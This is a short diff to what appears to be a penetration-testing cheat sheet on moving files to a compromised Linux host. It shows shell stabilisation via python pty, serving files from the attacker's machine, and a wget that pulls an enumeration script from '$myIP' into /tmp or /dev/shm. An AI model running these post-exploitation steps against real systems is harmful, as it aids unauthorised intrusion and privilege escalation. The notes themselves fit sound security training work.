@@ -195,7 +195,7 @@ oLink.Save
 ## File Transfer to Linux 
 0.`python3 -c 'import pty; pty.spawn("/bin/bash")'` `export TERM=xterm-256color` Stabalize shell \
 1.`python3 -m http.server 8080` `or( 80)`
-2.`cd /tmp` move directory where we have write access.
+2.`cd /tmp`  `cd /dev/shm `move directory where we have write access.
 4.`wget http://$myIP:8080/linEum.sh .` \
 7.Or manually download the latest linpeas https://github.com/carlospolop/PEASS-ng/releases/tag/20221225
 
